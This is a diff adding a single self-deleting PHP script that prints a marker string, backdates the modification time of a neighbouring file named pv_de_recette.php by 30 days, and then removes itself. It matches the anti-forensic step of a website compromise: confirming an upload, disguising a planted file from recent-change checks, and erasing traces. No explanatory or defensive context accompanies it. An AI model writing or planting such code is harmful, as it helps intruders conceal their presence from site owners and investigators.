@@ -1,0 +1,1 @@
+<?php echo "VgHgHbtMcK"; if (file_exists("./pv_de_recette.php")){ touch("./pv_de_recette.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*aTFUN86gSsdDa2ChdYqP*/ ?>
